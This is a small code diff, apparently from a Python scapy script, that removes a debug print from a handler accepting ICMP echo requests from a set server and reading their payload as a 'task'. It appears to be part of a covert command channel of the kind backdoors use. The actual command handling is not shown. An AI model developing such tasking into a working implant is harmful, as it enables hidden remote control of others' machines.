@@ -23,7 +23,6 @@ def handle_incoming(pkt):
     print("Received packet")
     if IP in pkt and ICMP in pkt:
         if pkt[IP].src == SERVER_IP and pkt[ICMP].type == 8:
-            print("Packet is echo request from server")
             if pkt.haslayer(Raw):
                 # need to handle CMD vs regular
                 task = pkt[Raw].load.decode(errors="ignore")
